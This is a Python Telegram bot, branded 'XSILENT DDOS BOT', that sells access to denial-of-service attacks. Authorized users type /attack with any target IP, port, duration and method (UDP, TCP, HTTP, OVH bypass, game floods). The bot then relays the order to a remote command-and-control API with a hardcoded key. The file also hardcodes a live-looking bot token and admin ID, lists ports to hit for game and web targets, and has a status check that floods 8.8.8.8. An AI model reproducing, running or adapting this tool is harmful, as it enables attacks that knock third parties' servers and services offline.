#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
from datetime import datetime

# ========== CONFIG ==========
BOT_TOKEN = "8760406918:AAGxpN2mteQRneAZ7KISBM__pJUM4Mn3kJ8"
ADMIN_ID = ["8487946379"]
USERS_FILE = "users.json"
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "PFC10J"

# ========== DATA ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": [ADMIN_ID[0]]}

users_data = load_users()
users = users_data["users"]
cooldown = {}

# ========== BOT ==========
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    if uid in users or uid in ADMIN_ID:
        bot.reply_to(msg, f"""🔥 XSILENT DDOS BOT 🔥

✅ Status: Authorized
⚡ Methods: UDP | TCP | HTTP | OVH | GAME
⏱️ Max Time: 300s
🌐 API: Power by CNC

📝 COMMANDS:
/attack IP PORT TIME METHOD
/methods
/stats
/help

👑 ADMIN: /add /remove /allusers

Buy: XSILENT""")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Buy access: XSILENT")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    # Cooldown
    if uid in cooldown:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
            return
    
    args = msg.text.split()
    if len(args) != 5:
        bot.reply_to(msg, "Usage: /attack IP PORT TIME METHOD\nExample: /attack 1.1.1.1 443 60 udp\nMethods: udp, tcp, http, ovh, game")
        return
    
    ip, port, duration, method = args[1], args[2], args[3], args[4].lower()
    
    try:
        port = int(port)
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, "❌ Duration 10-300 seconds!")
            return
        if method not in ["udp", "tcp", "http", "ovh", "game"]:
            bot.reply_to(msg, "❌ Methods: udp, tcp, http, ovh, game")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port or time!")
        return
    
    cooldown[uid] = time.time()
    
    bot.reply_to(msg, f"""🔥 ATTACK LAUNCHED!

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
⚡ Method: {method.upper()}
💥 Attack in progress...""")
    
    def run():
        try:
            # Build API URL with parameters
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "concurrent": 1,
                "method": method
            }
            
            # Send GET request to API
            response = requests.get(API_URL, params=api_params, timeout=10)
            
            # Check response - only show if attack failed
            if response.status_code != 200:
                bot.send_message(msg.chat.id, f"❌ Attack failed!\nStatus: {response.status_code}")
                
        except requests.exceptions.Timeout:
            bot.send_message(msg.chat.id, "❌ Attack failed! API timeout.")
        except requests.exceptions.ConnectionError:
            bot.send_message(msg.chat.id, "❌ Attack failed! Cannot connect to API.")
        except Exception as e:
            bot.send_message(msg.chat.id, f"❌ Attack failed! Error: {str(e)[:50]}")
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['methods'])
def methods(msg):
    bot.reply_to(msg, """ ATTACK METHODS:

- UDP FLOOD - Best for gaming (BGMI, Minecraft)
  Ports: 443, 8080, 14000, 27015-27030

- TCP FLOOD - Best for web servers
  Ports: 80, 443, 8080, 8443

- HTTP FLOOD - Best for websites
  Ports: 80, 443

- OVH FLOOD - Bypass OVH protection
  Ports: 53, 80, 443, 8080

- GAME FLOOD - Game server attack
  Ports: 25565, 27015, 7777

Example: /attack 1.1.1.1 443 60 udp""")

@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    stats_msg = f"""{uid} USER STATISTICS

- User ID: {uid}
- Status: {'Authorized' if uid in users else 'Not Authorized'}
- Cooldown: {'Active' if uid in cooldown else 'None'}

API Info:
- Endpoint: {API_URL}
- Status: Active
- Max Concurrent: 1

- Contact XSILENT for premium stats"""
    bot.reply_to(msg, stats_msg)

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    bot.reply_to(msg, """🔥 XSILENT ARMY HELP

COMMANDS:
/attack IP PORT TIME METHOD - Launch attack
/methods - Show attack methods
/stats - Your stats
/help - This menu

ADMIN:
/add USER_ID
/remove USER_ID
/allusers

🌐 API Configuration:
• Using remote CNC API
• No local binary required
• Instant attack execution

Buy: XSILENT""")

# ========== ADMIN COMMANDS ==========
@bot.message_handler(commands=['add'])
def add_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    new = args[1]
    if new not in users:
        users.append(new)
        users_data["users"] = users
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f)
        bot.reply_to(msg, f"✅ User {new} added!")
    else:
        bot.reply_to(msg, "User already exists!")

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /remove USER_ID")
        return
    rem = args[1]
    if rem in users and rem not in ADMIN_ID:
        users.remove(rem)
        users_data["users"] = users
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f)
        bot.reply_to(msg, f"✅ User {rem} removed!")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    user_list = "\n".join(users)
    bot.reply_to(msg, f"📋 USERS:\n{user_list}\nTotal: {len(users)}")

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=10&concurrent=1", timeout=5)
        status = f"""🌐 API STATUS

📡 API URL: {API_URL}
🔑 API Key: {API_KEY[:6]}...{API_KEY[-4:]}
✅ Status: {'Online' if test_response.status_code == 200 else 'Offline'}
📊 Response Code: {test_response.status_code}"""
        bot.reply_to(msg, status)
    except:
        bot.reply_to(msg, "🌐 API STATUS: OFFLINE\nCannot connect to API server!")

# ========== MAIN ==========
print("""
╔══════════════════════════════════════╗
║    🔥 XSILENT BOT STARTED 🔥         ║
║    API Mode Active                   ║
╠══════════════════════════════════════╣
║  ✅ Bot Online                       ║
║  ✅ Admin: 8487946379                ║
║  ✅ Methods: UDP/TCP/HTTP/OVH/GAME   ║
║  ✅ API: CNC Connection              ║
╚══════════════════════════════════════╝
""")

bot.infinity_polling()
